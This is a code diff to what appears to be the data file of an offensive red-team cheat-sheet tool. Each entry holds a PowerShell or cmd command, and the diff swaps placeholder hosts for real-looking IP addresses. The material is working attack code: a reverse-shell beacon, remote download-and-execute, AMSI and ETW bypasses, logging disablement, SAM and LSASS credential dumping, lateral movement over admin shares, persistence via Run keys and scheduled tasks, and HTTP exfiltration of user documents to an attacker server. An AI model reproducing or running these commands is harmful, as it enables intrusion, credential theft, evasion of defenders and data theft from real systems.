AgACAAIAAkAHcAcgBpAHQAZQByAC4AVwByAGkAdABlAEwAaQBuAGUAKAAiAEUAUgBSAE8AUgA6ACAAJABfACIAKQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJAB3AHIAaQB0AGUAcgAuAFcAcgBpAHQAZQBMAGkAbgBlACgAIgA8ADwARQBOAEQAPgA+ACIAKQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0ACgAgACAAIAAgACAAIAAgACAAfQAKACAAIAAgACAAIAAgACAAIAAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQAKACAAIAAgACAAfQAgAGMAYQB0AGMAaAAgAHsAfQAKAAoAIAAgACAAIABTAHQAYQByAHQALQBTAGwAZQBlAHAAIAAtAFMAZQBjAG8AbgBkAHMAIAAkAHMAbABlAGUAcABTAGUAYwBvAG4AZABzAAoAfQAKAA==",
     tags: ["ps", "evasion", "c2"],
     accent: "#e91e63"
   },
   {
     title: "Minified Beacon (One-liner)",
-    code: "$h=\"VPS_IP\";$p=4444;while(1){try{$t=New-Object Net.Sockets.TCPClient($h,$p);$s=$t.GetStream();$w=New-Object IO.StreamWriter($s);$r=New-Object IO.StreamReader($s);$w.AutoFlush=1;$w.WriteLine(\"[+] $env:COMPUTERNAME\$env:USERNAME\");while($t.Connected){$w.Write(\"PS> \");$c=$r.ReadLine();if(!$c-or$c-eq'exit'){break};try{$w.WriteLine((iex $c 2>&1|Out-String).TrimEnd())}catch{$w.WriteLine(\"ERR: $_\")}}$t.Close()}catch{};sleep 10}",
+    desc: "Compact reverse shell with auto-reconnect. Single line for easy deployment.",
+    code: "$h=\"168.144.166.97\";$p=4444;while(1){try{$t=New-Object Net.Sockets.TCPClient($h,$p);$s=$t.GetStream();$w=New-Object IO.StreamWriter($s);$r=New-Object IO.StreamReader($s);$w.AutoFlush=1;$w.WriteLine(\"[+] $env:COMPUTERNAME\\$env:USERNAME\");while($t.Connected){$w.Write(\"PS> \");$c=$r.ReadLine();if(!$c-or$c-eq'exit'){break};try{$w.WriteLine((iex $c 2>&1|Out-String).TrimEnd())}catch{$w.WriteLine(\"ERR: $_\")}}$t.Close()}catch{};sleep 10}",
     tags: ["ps", "evasion", "c2"],
     accent: "#e91e63"
   },
   {
     title: "AMSI Bypass (Reflection)",
+    desc: "Bypass AMSI by setting amsiInitFailed to true via reflection.",
     code: "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
     tags: ["ps", "evasion"],
     accent: "#e91e63"
   },
   {
     title: "AMSI Bypass (Patching)",
+    desc: "Zero out AMSI context pointer to disable scanning.",
     code: "$a=[Ref].Assembly.GetTypes()|?{$_.Name-like'*siUtils'};$f=$a.GetFields('NonPublic,Static')|?{$_.Name-like'*Context'};$f.SetValue($null,[IntPtr]::Zero)",
     tags: ["ps", "evasion"],
     accent: "#e91e63"
   },
   {
     title: "Disable Script Block Logging",
-    code: "$k='HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging';if(!(Test-Path $k)){New-Item $k -Force};Set-ItemProperty $k -Name EnableScriptBlockLogging -Value 0",
+    desc: "Turn off PowerShell script block logging via registry.",
+    code: "$k='HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging';if(!(Test-Path $k)){New-Item $k -Force};Set-ItemProperty $k -Name EnableScriptBlockLogging -Value 0",
     tags: ["ps", "evasion"],
     accent: "#e91e63"
   },
   {
     title: "Disable Module Logging",
-    code: "$k='HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging';if(!(Test-Path $k)){New-Item $k -Force};Set-ItemProperty $k -Name EnableModuleLogging -Value 0",
+    desc: "Turn off PowerShell module logging via registry.",
+    code: "$k='HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging';if(!(Test-Path $k)){New-Item $k -Force};Set-ItemProperty $k -Name EnableModuleLogging -Value 0",
     tags: ["ps", "evasion"],
     accent: "#e91e63"
   },
   {
     title: "Disable Transcription",
-    code: "$k='HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription';if(!(Test-Path $k)){New-Item $k -Force};Set-ItemProperty $k -Name EnableTranscripting -Value 0",
+    desc: "Turn off PowerShell transcription logging via registry.",
+    code: "$k='HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription';if(!(Test-Path $k)){New-Item $k -Force};Set-ItemProperty $k -Name EnableTranscripting -Value 0",
     tags: ["ps", "evasion"],
     accent: "#e91e63"
   },
   {
     title: "ETW Bypass (Disable Tracing)",
+    desc: "Disable Event Tracing for Windows (ETW) to evade logging.",
     code: "[Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0)",
     tags: ["ps", "evasion"],
     accent: "#e91e63"
   },
   {
     title: "Constrained Language Mode Bypass",
+    desc: "Attempt to escape Constrained Language Mode. May not work if enforced.",
     code: "$ExecutionContext.SessionState.LanguageMode = 'FullLanguage'",
     tags: ["ps", "evasion"],
     accent: "#e91e63"
   },
   {
     title: "Parent PID Spoofing Setup",
+    desc: "Basic process spawn with ProcessStartInfo. Extend for PPID spoofing.",
     code: "$pi=New-Object System.Diagnostics.ProcessStartInfo;$pi.FileName='cmd.exe';$pi.Arguments='/c whoami';$pi.UseShellExecute=$false;$p=[System.Diagnostics.Process]::Start($pi)",
     tags: ["ps", "evasion"],
     accent: "#e91e63"
   },
   {
     title: "Base64 Encode Command",
+    desc: "Encode a command to base64 for -enc parameter. Uses Unicode encoding.",
     code: "$cmd='whoami';$bytes=[System.Text.Encoding]::Unicode.GetBytes($cmd);[Convert]::ToBase64String($bytes)",
     tags: ["ps", "evasion"],
     accent: "#e91e63"
   },
   {
     title: "XOR Obfuscation",
+    desc: "XOR encode/decode and execute. Change key (0x42) for variation.",
     code: "$key=0x42;$enc=[System.Text.Encoding]::UTF8.GetBytes('whoami')|%{$_-bxor$key};$dec=$enc|%{$_-bxor$key};[System.Text.Encoding]::UTF8.GetString($dec)|iex",
     tags: ["ps", "evasion"],
     accent: "#e91e63"
   },
   {
     title: "String Concatenation Obfuscation",
+    desc: "Split command into variables to bypass string detection.",
     code: "$a='who';$b='ami';iex($a+$b)",
     tags: ["ps", "evasion"],
     accent: "#e91e63"
   },
   {
     title: "Environment Variable Stash",
-    code: "$env:x='IEX(IWR http://VPS/b.ps1)';powershell -c $env:x",
+    desc: "Store payload in env var and execute via child process.",
+    code: "$env:x='IEX(IWR http://168.144.166.97:8889/b.ps1)';powershell -c $env:x",
     tags: ["ps", "evasion"],
     accent: "#e91e63"
   },
   {
     title: "Invoke via Reflection",
+    desc: "Execute command via ScriptBlock.Create to evade logging.",
     code: "[ScriptBlock]::Create('whoami').Invoke()",
     tags: ["ps", "evasion"],
     accent: "#e91e63"
   },
   {
     title: "Double Base64 Encode",
+    desc: "Double encode a command to bypass simple base64 detection. Replace 'whoami' with your payload.",
     code: "$c='whoami';$e1=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($c));$e2=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($e1));Write-Host $e2",
     tags: ["ps", "evasion"],
     accent: "#e91e63"
   },
   {
     title: "GZip Compressed Payload",
+    desc: "Compress a payload with GZip and output as base64. Replace 'whoami' with your command.",
     code: "$s=[IO.MemoryStream]::new();$g=[IO.Compression.GZipStream]::new($s,[IO.Compression.CompressionMode]::Compress);$w=[IO.StreamWriter]::new($g);$w.Write('whoami');$w.Close();[Convert]::ToBase64String($s.ToArray())",
     tags: ["ps", "evasion"],
     accent: "#e91e63"
   },
   {
     title: "Alternate Data Stream Hide",
-    code: "Set-Content -Path C:\temp\legit.txt -Value 'normal' -Stream ':hidden' -Value 'malicious payload'",
+    desc: "Hide payload in NTFS Alternate Data Stream. Change path and payload content as needed.",
+    code: "Set-Content -Path C:\\temp\\legit.txt -Value 'normal' -Stream ':hidden' -Value 'payload here'",
     tags: ["ps", "evasion"],
     accent: "#e91e63"
   },
   {
     title: "Process Hollowing Check",
+    desc: "Find processes with no loaded modules - potential indicators of process hollowing.",
     code: "Get-Process | Where-Object {$_.Modules.Count -eq 0}",
     tags: ["ps", "evasion"],
     accent: "#e91e63"
   },
   {
     title: "Timestomp File",
-    code: "$f='C:\temp\file.exe';$d=Get-Date '01/01/2020';(Get-Item $f).CreationTime=$d;(Get-Item $f).LastWriteTime=$d;(Get-Item $f).LastAccessTime=$d",
+    desc: "Change file timestamps to blend in. Edit file path and date as needed.",
+    code: "$f='C:\\temp\\file.exe';$d=Get-Date '01/01/2020';(Get-Item $f).CreationTime=$d;(Get-Item $f).LastWriteTime=$d;(Get-Item $f).LastAccessTime=$d",
     tags: ["ps", "evasion"],
     accent: "#e91e63"
   },
   {
     title: "Dump SAM/SYSTEM Hives",
-    code: "reg save HKLM\\\\SAM C:\\\\temp\\\\sam.save; reg save HKLM\\\\SYSTEM C:\\\\temp\\\\system.save",
+    desc: "Extract SAM and SYSTEM hives for offline password cracking. Requires admin.",
+    code: "reg save HKLM\\SAM C:\\temp\\sam.save; reg save HKLM\\SYSTEM C:\\temp\\system.save",
     tags: ["ps", "postexploit", "privesc"],
     accent: "#ff9800"
   },
   {
     title: "WiFi Passwords Dump",
+    desc: "Extract saved WiFi passwords in plaintext from all stored profiles.",
     code: "netsh wlan show profiles | Select-String 'All User' | ForEach-Object { netsh wlan show profile name=($_ -split ':')[1].Trim() key=clear }",
     tags: ["ps", "postexploit"],
     accent: "#ff9800"
   },
   {
     title: "Credential Manager List",
+    desc: "List saved credentials in Windows Credential Manager.",
     code: "cmdkey /list",
     tags: ["cmd", "postexploit"],
     accent: "#ff9800"
   },
   {
     title: "Check Impersonation Privs",
+    desc: "Check for potato-style privesc tokens (SeImpersonate/SeAssignPrimaryToken).",
     code: "whoami /priv | findstr \"SeImpersonate SeAssignPrimaryToken\"",
     tags: ["cmd", "postexploit", "privesc"],
     accent: "#ff9800"
   },
   {
     title: "WMI Remote Exec",
-    code: "wmic /node:\"TARGET\" process call create \"powershell -enc BASE64\"",
+    desc: "Execute command on remote host via WMI. Replace BASE64 with encoded payload.",
+    code: "wmic /node:\"4.200.69.210\" process call create \"powershell -enc BASE64\"",
     tags: ["cmd", "postexploit", "lateral"],
     accent: "#ff9800"
   },
   {
     title: "PSRemoting Test",
-    code: "Test-WSMan -ComputerName TARGET; Enter-PSSession -ComputerName TARGET",
+    desc: "Test WinRM connectivity then enter interactive PS session on remote host.",
+    code: "Test-WSMan -ComputerName 4.200.69.210; Enter-PSSession -ComputerName 4.200.69.210",
     tags: ["ps", "postexploit", "lateral"],
     accent: "#ff9800"
   },
   {
     title: "SMB Lateral Movement",
-    code: "net use \\\\\\\\TARGET\\\\C$ /user:DOMAIN\\\\user password; copy beacon.exe \\\\\\\\TARGET\\\\C$\\\\temp\\\\",
+    desc: "Mount admin share on target then copy payload. Edit credentials and payload name.",
+    code: "net use \\\\4.200.69.210\\C$ /user:WORKGROUP\\adminvm1 password; copy beacon.exe \\\\4.200.69.210\\C$\\temp\\",
     tags: ["cmd", "postexploit", "lateral"],
     accent: "#ff9800"
   },
   {
     title: "Registry Run Persistence",
-    code: "Set-ItemProperty -Path 'HKCU:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run' -Name 'Update' -Value 'powershell -w hidden -enc BASE64'",
+    desc: "Add registry Run key for persistence. Replace BASE64 with your encoded payload.",
+    code: "Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'Update' -Value 'powershell -w hidden -enc BASE64'",
     tags: ["ps", "postexploit", "persist"],
     accent: "#ff9800"
   },
   {
     title: "Scheduled Task Persistence",
+    desc: "Create SYSTEM-level scheduled task that runs on logon. Replace BASE64 with payload.",
     code: "schtasks /create /tn \"SystemUpdate\" /tr \"powershell -w hidden -enc BASE64\" /sc onlogon /ru SYSTEM",
     tags: ["cmd", "postexploit", "persist"],
     accent: "#ff9800"
   },
   {
     title: "Find Sensitive Files",
-    code: "Get-ChildItem -Path C:\\\\Users -Recurse -Include '*.kdbx','*.key','*password*','*credential*','*.rdp','*.ppk' -ErrorAction SilentlyContinue",
+    desc: "Search for password managers, keys, RDP files and credential files in Users folder.",
+    code: "Get-ChildItem -Path C:\\Users -Recurse -Include '*.kdbx','*.key','*password*','*credential*','*.rdp','*.ppk' -ErrorAction SilentlyContinue",
     tags: ["ps", "postexploit"],
     accent: "#ff9800"
   },
   {
     title: "Chrome Login Data Location",
-    code: "dir $env:LOCALAPPDATA\\\\Google\\\\Chrome\\\\'User Data'\\\\Default\\\\'Login Data'",
+    desc: "Check if Chrome Login Data database exists (contains saved passwords).",
+    code: "dir \"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data\"",
     tags: ["ps", "postexploit"],
     accent: "#ff9800"
   },
   {
     title: "Firefox Passwords Location",
-    code: "dir $env:APPDATA\\\\Mozilla\\\\Firefox\\\\Profiles\\\\*\\\\logins.json",
+    desc: "Find Firefox logins.json containing saved passwords (encrypted).",
+    code: "dir \"$env:APPDATA\\Mozilla\\Firefox\\Profiles\\*\\logins.json\"",
     tags: ["ps", "postexploit"],
     accent: "#ff9800"
   },
   {
     title: "RDP Saved Connections",
-    code: "reg query 'HKCU\\\\Software\\\\Microsoft\\\\Terminal Server Client\\\\Servers'",
+    desc: "List previously connected RDP hosts from registry.",
+    code: "reg query \"HKCU\\Software\\Microsoft\\Terminal Server Client\\Servers\"",
     tags: ["cmd", "postexploit"],
     accent: "#ff9800"
   },
   {
     title: "Port Forward (Pivot)",
-    code: "netsh interface portproxy add v4tov4 listenport=8888 listenaddress=0.0.0.0 connectport=3389 connectaddress=INTERNAL_TARGET",
+    desc: "Create port forward to pivot to internal host. Change listenport and connectaddress.",
+    code: "netsh interface portproxy add v4tov4 listenport=8888 listenaddress=0.0.0.0 connectport=3389 connectaddress=4.200.69.210",
     tags: ["cmd", "postexploit", "lateral"],
     accent: "#ff9800"
   },
   {
     title: "ARP Cache (Find Hosts)",
+    desc: "Display ARP cache to discover recently communicated hosts on local network.",
     code: "arp -a",
     tags: ["cmd", "postexploit", "recon"],
     accent: "#ff9800"
   },
   {
     title: "Internal Network Scan",
+    desc: "Ping sweep internal /24 subnet to find live hosts. Change subnet prefix as needed.",
     code: "1..254 | ForEach-Object { Test-Connection -ComputerName \"192.168.1.$_\" -Count 1 -Quiet -ErrorAction SilentlyContinue | Where-Object {$_} | ForEach-Object { \"192.168.1.$_\" } }",
     tags: ["ps", "postexploit", "recon"],
     accent: "#ff9800"
   },
   {
     title: "Domain Computers List",
+    desc: "List all computer accounts in the domain (requires domain membership).",
     code: "net group \"Domain Computers\" /domain",
     tags: ["cmd", "postexploit", "recon"],
     accent: "#ff9800"
   },
   {
     title: "Domain Admins List",
+    desc: "List members of Domain Admins group (high-value targets).",
     code: "net group \"Domain Admins\" /domain",
     tags: ["cmd", "postexploit", "recon"],
     accent: "#ff9800"
   },
   {
     title: "Recent Documents",
-    code: "Get-ChildItem $env:APPDATA\\\\Microsoft\\\\Windows\\\\Recent -ErrorAction SilentlyContinue",
+    desc: "List recently accessed files via Windows Recent folder shortcuts.",
+    code: "Get-ChildItem \"$env:APPDATA\\Microsoft\\Windows\\Recent\" -ErrorAction SilentlyContinue",
     tags: ["ps", "postexploit"],
     accent: "#ff9800"
   },
   {
     title: "Cached Domain Creds Count",
-    code: "reg query 'HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon' /v CachedLogonsCount",
+    desc: "Check how many domain credentials are cached locally (default 10).",
+    code: "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v CachedLogonsCount",
     tags: ["cmd", "postexploit"],
     accent: "#ff9800"
   },
   {
     title: "View Network Shares",
+    desc: "List domain computers and local shares for lateral movement targets.",
     code: "net view /domain; net share",
     tags: ["cmd", "postexploit", "recon"],
     accent: "#ff9800"
   },
   {
     title: "Kerberos Tickets",
+    desc: "Display cached Kerberos tickets for pass-the-ticket attacks.",
     code: "klist",
     tags: ["cmd", "postexploit"],
     accent: "#ff9800"
   },
   {
     title: "Logged On Users",
+    desc: "List currently logged on users and RDP sessions.",
     code: "query user; qwinsta",
     tags: ["cmd", "postexploit", "recon"],
     accent: "#ff9800"
   },
   {
     title: "Process with Tokens",
+    desc: "List processes with owner usernames for token impersonation targets.",
     code: "Get-Process -IncludeUserName | Select-Object Name, Id, UserName | Format-Table -AutoSize",
     tags: ["ps", "postexploit"],
     accent: "#ff9800"
   },
   {
     title: "Installed Software",
-    code: "Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion",
+    desc: "List installed programs with versions - look for vulnerable software.",
+    code: "Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName, DisplayVersion",
     tags: ["ps", "postexploit", "recon"],
     accent: "#ff9800"
   },
   {
     title: "Keep-Alive Scheduled Task",
+    desc: "Create task that runs every 5 mins to prevent session timeout/idle disconnect.",
     code: "schtasks /create /tn \"KeepAlive\" /tr \"powershell -w hidden -c Get-Date\" /sc minute /mo 5 /ru SYSTEM /f",
     tags: ["cmd", "persist"],
     accent: "#e74c3c"
   },
   {
     title: "Find Idle/Shutdown Services",
+    desc: "Find services that may auto-terminate sessions based on idle time.",
     code: "Get-Service | Where-Object {$_.DisplayName -match 'shutdown|idle|timeout'} | Select-Object Name, DisplayName, Status",
     tags: ["ps", "recon"],
     accent: "#00f0ff"
   },
   {
     title: "Disable Idle Checker Service",
+    desc: "Stop and disable any idle-detection services that may disconnect session.",
     code: "Get-Service | Where-Object {$_.DisplayName -match 'Idle'} | Stop-Service -Force -PassThru | Set-Service -StartupType Disabled",
     tags: ["ps", "persist"],
     accent: "#e74c3c"
   },
   {
     title: "Mouse Jiggle (Anti-Idle)",
+    desc: "Simulate mouse movement every 5 mins to prevent idle lockout. Run in background.",
     code: "Add-Type -AssemblyName System.Windows.Forms; while($true){$p=[System.Windows.Forms.Cursor]::Position;[System.Windows.Forms.Cursor]::Position=New-Object System.Drawing.Point(($p.X+1),$p.Y);Start-Sleep -ms 100;[System.Windows.Forms.Cursor]::Position=$p;Start-Sleep -s 300}",
     tags: ["ps", "persist"],
     accent: "#e74c3c"
   },
   {
     title: "Verify Keep-Alive Task",
+    desc: "Check if KeepAlive scheduled task is installed and its status.",
     code: "schtasks /query /tn \"KeepAlive\"",
     tags: ["cmd", "recon"],
     accent: "#00f0ff"
   },
   {
     title: "Remove Keep-Alive Task",
+    desc: "Delete the KeepAlive scheduled task during cleanup.",
     code: "schtasks /delete /tn \"KeepAlive\" /f",
     tags: ["cmd"],
     accent: "#00f0ff"
   },
   {
     title: "[P1] Situational Awareness",
+    desc: "Initial recon playbook: user context, hostname, IP, OS version, admin group, integrity level.",
     code: "whoami /all\nhostname\nipconfig /all\nsysteminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\"\nnet localgroup administrators\nwhoami /groups | findstr \"S-1-16-12288\"",
     tags: ["playbook", "recon"],
     accent: "#ffeb3b"
   },
   {
     title: "[P2] Defender Status Check",
+    desc: "Check if Defender real-time protection and tamper protection are enabled.",
     code: "Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled, AntivirusEnabled, IsTamperProtected",
     tags: ["playbook", "defender", "recon"],
     accent: "#ffeb3b"
   },
   {
     title: "[P2] Check Exclusions (Gold)",
+    desc: "List Defender exclusions - these paths/processes bypass scanning. Gold mine if populated.",
     code: "Get-MpPreference | Select-Object ExclusionPath, ExclusionProcess, ExclusionExtension",
     tags: ["playbook", "defender", "recon"],
     accent: "#ffeb3b"
   },
   {
     title: "[P2] Detect EDR/AV Processes",
+    desc: "Find running AV/EDR processes to understand what defenses are active.",
     code: "Get-Process | Where-Object {$_.ProcessName -match 'defender|sentinel|crowd|carbon|cylance|sophos|symantec|mcafee|kasper|eset|trend|avg|avast'}",
     tags: ["playbook", "recon"],
     accent: "#ffeb3b"
   },
   {
     title: "[P2] Check PS Logging",
+    desc: "Check if PowerShell script block and module logging are enabled (OPSEC check).",
     code: "reg query \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging\"\nreg query \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging\"",
     tags: ["playbook", "recon", "evasion"],
     accent: "#ffeb3b"
   },
   {
     title: "[P3] WiFi Passwords",
+    desc: "Extract all saved WiFi passwords in cleartext from wireless profiles.",
     code: "netsh wlan show profiles | Select-String 'All User' | %{ netsh wlan show profile name=($_ -split ':')[1].Trim() key=clear }",
     tags: ["playbook", "postexploit"],
     accent: "#ffeb3b"
   },
   {
     title: "[P3] Saved Credentials",
+    desc: "List Windows Credential Manager entries - may contain domain/service creds.",
     code: "cmdkey /list",
     tags: ["playbook", "postexploit"],
     accent: "#ffeb3b"
   },
   {
     title: "[P3] Find Unattend Files",
+    desc: "Search for sysprep/unattend XML files that may contain cleartext passwords.",
     code: "Get-ChildItem -Path C:\\ -Recurse -Include 'unattend.xml','sysprep.xml','autounattend.xml' -ErrorAction SilentlyContinue",
     tags: ["playbook", "postexploit"],
     accent: "#ffeb3b"
   },
   {
     title: "[P3] Web.config Connection Strings",
+    desc: "Search IIS web.config files for database connection strings with credentials.",
     code: "Get-ChildItem -Path C:\\inetpub -Recurse -Include 'web.config' -ErrorAction SilentlyContinue | Select-String 'connectionString'",
     tags: ["playbook", "postexploit"],
     accent: "#ffeb3b"
   },
   {
     title: "[P3] PowerShell History",
+    desc: "Read PowerShell command history - may contain passwords typed in cleartext.",
     code: "Get-Content (Get-PSReadLineOption).HistorySavePath -ErrorAction SilentlyContinue",
     tags: ["playbook", "postexploit"],
     accent: "#ffeb3b"
   },
   {
     title: "[P4] Unquoted Service Paths",
+    desc: "Find auto-start services with unquoted paths containing spaces (privesc vector).",
     code: "wmic service get name,displayname,pathname,startmode | findstr /i 'auto' | findstr /i /v 'c:\\windows'",
     tags: ["playbook", "privesc"],
     accent: "#ffeb3b"
   },
   {
     title: "[P4] AlwaysInstallElevated Check",
+    desc: "Check if MSI files run elevated (both keys must be 1 for privesc).",
     code: "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nreg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
     tags: ["playbook", "privesc"],
     accent: "#ffeb3b"
   },
   {
     title: "[P4] Weak Service Permissions",
+    desc: "List non-Windows services to check for weak binary/folder permissions.",
     code: "Get-WmiObject win32_service | Where-Object {$_.PathName -notlike 'C:\\Windows\\*'} | Select-Object Name, PathName, StartMode, State",
     tags: ["playbook", "privesc"],
     accent: "#ffeb3b"
   },
   {
     title: "[P4] Token Privs (Potato Check)",
+    desc: "Check for SeImpersonate/SeAssignPrimaryToken for potato-style SYSTEM escalation.",
     code: "whoami /priv | findstr 'SeImpersonate SeAssignPrimaryToken'",
     tags: ["playbook", "privesc"],
     accent: "#ffeb3b"
   },
   {
     title: "[P5] Dump SAM/SYSTEM Hives",
+    desc: "Export SAM and SYSTEM registry hives for offline hash extraction. Requires admin.",
     code: "mkdir C:\\temp -Force\nreg save HKLM\\SAM C:\\temp\\sam.save\nreg save HKLM\\SYSTEM C:\\temp\\system.save",
     tags: ["playbook", "postexploit"],
     accent: "#ffeb3b"
   },
   {
     title: "[P5] LSASS Dump (comsvcs)",
+    desc: "Dump LSASS memory using built-in comsvcs.dll. Parse offline with pypykatz.",
     code: "rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\\temp\\lsass.dmp full",
     tags: ["playbook", "postexploit"],
     accent: "#ffeb3b"
   },
   {
     title: "[P6] Registry Run Persistence",
+    desc: "Add user-level Run key persistence. Replace BASE64 with encoded payload.",
     code: "Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'Update' -Value 'powershell -w hidden -enc BASE64'",
     tags: ["playbook", "persist"],
     accent: "#ffeb3b"
   },
   {
     title: "[P6] Scheduled Task Persistence",
+    desc: "Create SYSTEM task that executes on any user logon. Replace BASE64 with payload.",
     code: "schtasks /create /tn 'WindowsUpdate' /tr 'powershell -w hidden -enc BASE64' /sc onlogon /ru SYSTEM /f",
     tags: ["playbook", "persist"],
     accent: "#ffeb3b"
   },
   {
     title: "[P6] Service Persistence",
+    desc: "Create auto-start service for persistence. Replace BASE64 with encoded payload.",
     code: "sc create UpdateSvc binPath= 'cmd /c powershell -enc BASE64' start= auto",
     tags: ["playbook", "persist"],
     accent: "#ffeb3b"
   },
   {
     title: "[P7] Find Hosts (ARP/Domain)",
+    desc: "Discover lateral movement targets via ARP, domain computers, and DC list.",
     code: "arp -a\nnet view /domain\nnet group 'Domain Computers' /domain\nnltest /dclist:",
     tags: ["playbook", "lateral", "recon"],
     accent: "#ffeb3b"
   },
   {
     title: "[P7] SMB Access Check",
-    code: "net use \\\\TARGET\\C$ /user:DOMAIN\\user password\ndir \\\\TARGET\\C$\\Users",
+    desc: "Test admin share access to target. Replace credentials and target IP.",
+    code: "net use \\\\4.200.69.210\\C$ /user:WORKGROUP\\adminvm1 password\ndir \\\\4.200.69.210\\C$\\Users",
     tags: ["playbook", "lateral"],
     accent: "#ffeb3b"
   },
   {
     title: "[P7] PSRemoting Check",
-    code: "Test-WSMan -ComputerName TARGET\nEnter-PSSession -ComputerName TARGET",
+    desc: "Test WinRM then get interactive PowerShell session on remote target.",
+    code: "Test-WSMan -ComputerName 4.200.69.210\nEnter-PSSession -ComputerName 4.200.69.210",
     tags: ["playbook", "lateral"],
     accent: "#ffeb3b"
   },
   {
     title: "[P7] WMI Remote Exec",
-    code: "wmic /node:'TARGET' process call create 'powershell -enc BASE64'",
+    desc: "Execute encoded PowerShell on remote host via WMI. Replace BASE64 with payload.",
+    code: "wmic /node:'4.200.69.210' process call create 'powershell -enc BASE64'",
     tags: ["playbook", "lateral", "c2"],
     accent: "#ffeb3b"
   },
   {
     title: "[P8] Domain Enumeration",
+    desc: "Enumerate domain users, admins, and trust relationships.",
     code: "net user /domain\nnet group 'Domain Admins' /domain\nnltest /trusted_domains",
     tags: ["playbook", "recon"],
     accent: "#ffeb3b"
   },
   {
     title: "[P8] GPP Password Check",
+    desc: "Search SYSVOL for Group Policy Preferences passwords (cpassword field).",
     code: "findstr /S /I cpassword \\\\DOMAIN\\sysvol\\*.xml",
     tags: ["playbook", "postexploit"],
     accent: "#ffeb3b"
   },
   {
     title: "[P9] Compress for Exfil",
-    code: "Compress-Archive -Path C:\\Users\\target\\Documents -DestinationPath C:\\temp\\docs.zip",
+    desc: "Zip target folder for exfiltration. Change source and destination paths.",
+    code: "Compress-Archive -Path C:\\Users\\adminvm1\\Documents -DestinationPath C:\\temp\\docs.zip",
     tags: ["playbook", "postexploit"],
     accent: "#ffeb3b"
   },
   {
     title: "[P9] HTTP Exfil",
-    code: "$bytes = [IO.File]::ReadAllBytes('C:\\temp\\docs.zip')\nInvoke-WebRequest -Uri 'http://VPS:8080/upload' -Method POST -Body $bytes",
+    desc: "Exfiltrate file to VPS HTTP receiver. Ensure receiver is listening on port.",
+    code: "$bytes = [IO.File]::ReadAllBytes('C:\\temp\\docs.zip')\nInvoke-WebRequest -Uri 'http://168.144.166.97:8083/upload' -Method POST -Body $bytes",
     tags: ["playbook", "postexploit", "c2"],
     accent: "#ffeb3b"
   },
   {
     title: "[P4-EXPLOIT] AlwaysInstallElevated Abuse",
-    code: "msfvenom -p windows/x64/shell_reverse_tcp LHOST=VPS LPORT=4444 -f msi -o evil.msi\\nmsiexec /quiet /qn /i evil.msi",
+    desc: "Generate malicious MSI and install silently for SYSTEM shell. Run msfvenom on attacker.",
+    code: "msfvenom -p windows/x64/shell_reverse_tcp LHOST=168.144.166.97 LPORT=4444 -f msi -o evil.msi\nmsiexec /quiet /qn /i evil.msi",
     tags: ["playbook", "privesc"],
     accent: "#ff5722"
   },
   {
     title: "[P4-EXPLOIT] Unquoted Service Path Abuse",
-    code: "# If path: C:\\\\Program Files\\\\Vuln Service\\\\service.exe\\n# Drop at: C:\\\\Program.exe\\ncopy payload.exe C:\\\\Program.exe\\nsc stop VulnService & sc start VulnService",
+    desc: "Place payload at unquoted path break then restart service. Example: C:\\Program.exe",
+    code: "# If path: C:\\Program Files\\Vuln Service\\service.exe\n# Drop at: C:\\Program.exe\ncopy payload.exe C:\\Program.exe\nsc stop VulnService & sc start VulnService",
     tags: ["playbook", "privesc"],
     accent: "#ff5722"
   },
   {
     title: "[P4-EXPLOIT] Weak Service Permissions",
-    code: "accesschk.exe -uwcqv Users * /accepteula\\nsc config VulnSvc binPath= \"net localgroup administrators user /add\"\\nsc stop VulnSvc & sc start VulnSvc",
+    desc: "Find writable services with accesschk, replace binPath to add admin, restart.",
+    code: "accesschk.exe -uwcqv Users * /accepteula\nsc config VulnSvc binPath= \"net localgroup administrators adminvm1 /add\"\nsc stop VulnSvc & sc start VulnSvc",
     tags: ["playbook", "privesc"],
     accent: "#ff5722"
   },
   {
     title: "[P4-EXPLOIT] JuicyPotato (SeImpersonate)",
+    desc: "Abuse SeImpersonate for SYSTEM via DCOM. Replace BASE64 with your payload.",
